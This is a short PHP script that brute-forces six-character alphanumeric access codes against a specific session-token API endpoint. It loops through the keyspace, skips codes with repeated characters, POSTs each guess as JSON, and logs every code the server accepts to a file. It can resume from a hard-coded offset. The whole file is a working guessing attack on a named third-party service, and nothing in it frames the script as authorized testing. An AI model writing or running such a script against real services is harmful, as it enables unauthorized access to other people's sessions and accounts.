<?php

function postCurl($url, $data){
  $ch=curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  //curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
  $o=curl_exec($ch);
  curl_close($ch);
  return $o;
}

$values = "0123456789abcdefghijklmnopqrstuvwxyz";
$length = 6;
$valCount = strlen($values);
$URI = "https://platform-dev.vrtuoso.io/v1/sessions/get_token";

$amount = pow($valCount, $length);
echo "There are $amount possible combinations.\n";

$good = fopen("good.lst", 'w');

echo "Starting to check URLs\n";

$startFrom =
//0;
1718400;

for($k=$startFrom; $k<$amount; ++$k){
  $code = base_convert($k, 10, $valCount);
  if( strlen($code) < $length ) $code = str_pad ( $code, $length, '0', STR_PAD_LEFT );
  if( preg_match('/00|11|22|33|44|55|66|77|88|99|aa|bb|cc|dd|ee|ff|gg|hh|ii|jj|kk|ll|mm|nn|oo|pp|qq|rr|ss|tt|uu|vv|ww|xx|yy|zz/', $code)==1) continue;
  $perc = number_format( $k/$amount, 3 );
  echo "Testing $code - $k/$amount - $perc %\r";
  $ret = json_decode( postCurl( $URI, '{"access_data":"'.$code.'"}') );
  if( !isset($ret->status_code) ){
    echo "FOUND CODE: ".$code."                           \n";
    fwrite($good, $code."\n");
  }
}
fclose($good);
